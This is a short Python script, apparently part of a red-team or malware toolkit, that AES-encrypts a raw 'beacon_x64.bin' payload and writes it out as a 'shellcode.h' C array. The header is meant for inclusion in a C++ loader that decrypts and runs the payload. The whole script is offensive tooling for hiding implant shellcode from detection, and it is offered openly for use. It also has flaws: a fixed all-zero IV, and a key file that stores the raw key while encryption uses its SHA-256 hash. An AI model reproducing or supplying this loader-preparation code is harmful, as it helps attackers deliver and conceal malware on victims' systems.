'''
Author: hxhBrofessor

Purpose:
  This Python script performs AES encryption on a binary file. It generates an AES key, encrypts the content of the file,
  and writes the encrypted data to "shellcode.h". Additionally, it stores the AES key in "AESkey.txt" for decryption purposes.

Description:
  The script utilizes the pycryptodome library to handle encryption, padding, and key generation processes. It searches for
  a binary file named "beacon_x64.bin" in the specified directory and encrypts its content using AES-256 in CBC mode. The
  encrypted payload is written to "shellcode.h" as an unsigned char array, while the AES key is stored in "AESkey.txt".
  The "shellcode.h" file can be included in a C++ source file for further compilation and execution.

Usage:
  - Place the binary file in the specified directory.
  - Run the script using the command: python3 AESencryptor.py
  - The encrypted data will be written to "shellcode.h" and the AES key will be stored in "AESkey.txt".
  - Include "shellcode.h" in your C++ source file to access the encrypted data, and use the AES key in "AESkey.txt" for decryption.

Note:
  Each time the script is run, a new AES key is generated. Keep the "AESkey.txt" file secure to decrypt your data.

Dependencies:
  - pycryptodome library
  - hashlib module
  - base64 module
'''

import sys
from base64 import b64encode
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad
from Crypto.Random import get_random_bytes
import hashlib

KEY = get_random_bytes(16)
iv = 16 * b'\x00'
cipher = AES.new(hashlib.sha256(KEY).digest(), AES.MODE_CBC, iv)

try:
    plaintext = open("C:\\Users\\Sec504\\Documents\\1099\\GregsBestFriend\\G++\\testing\\beacon_x64.bin", "rb").read()
except:
    print("File argument needed! %s <raw payload file>")
    sys.exit()

ciphertext = cipher.encrypt(pad(plaintext, AES.block_size))

# Write AES key to AESkey.txt
with open("AESkey.txt", "w") as key_file:
    key_file.write('AESkey[] = { 0x' + ', 0x'.join(hex(x)[2:] for x in KEY) + ' };')

# Write ciphertext to payload.h
with open("shellcode.h", "w") as payload_file:
    payload_file.write('#ifndef SHELLCODE_H\n')
    payload_file.write('#define SHELLCODE_H\n\n')
    payload_file.write('unsigned char shellcode[] = { 0x' + ', 0x'.join(hex(x)[2:] for x in ciphertext) + ' };')
    payload_file.write('\n\nSIZE_T shellSize = sizeof(shellcode);')
    payload_file.write('\n\n#endif\n')
